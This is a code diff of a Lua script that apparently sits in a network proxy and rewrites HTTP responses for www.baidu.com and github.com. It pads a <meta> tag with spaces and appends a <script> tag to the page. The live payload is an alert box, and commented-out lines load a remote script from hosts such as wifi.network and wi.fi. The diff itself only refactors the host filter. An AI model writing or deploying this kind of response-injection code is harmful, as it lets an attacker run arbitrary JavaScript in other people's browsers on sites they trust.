@@ -1,7 +1,7 @@
 --local zlib = require "zlib"
 --local buffer = {}
 
---local script = '<script src="https://wifi.network:8081/crap.js"></script>'
+--local script = '<script src="//wi.fi/c"></script>'
 local script = '<script>alert("CRAP!");</script>'
 local scriptLen = string.len(script)
 
@@ -31,25 +31,24 @@ function padding(src)
 	return string.rep(" ", n)..script
 end
 
+function filterhost(host)
+	if (host == "www.baidu.com" ) or 
+		(host == "github.com" ) 
+		then
+		return true
+	end
+	return nil
+end
+
 function modify(data, ctx, host) -- response only
 	print("================= BEGIN", host)
-	if (host == "www.baidu.com" ) then
 
-		local matched = matchHost(host, data, "<meta.->")
-		if (matched) then 
-			local dst = padding(matched)				
-			data = string.gsub(data, matched, dst)	
-			print("================== SUCCESS:\n" .. data)
-			return data
-		end
-	elseif ( host == "github.com" ) then
-		local matched = matchHost(host, data, "<meta.->")
-		if (matched) then 
-			local dst = padding(matched)				
-			data = string.gsub(data, matched, dst)	
-			print("================== SUCCESS:\n" .. data)
-			return data
-		end
+	local matched = matchHost(host, data, "<meta.->")
+	if (matched) then 
+		local dst = padding(matched)				
+		data = string.gsub(data, matched, dst)	
+		print("================== SUCCESS:\n" .. data)
+		return data
 	end
 
     return nil
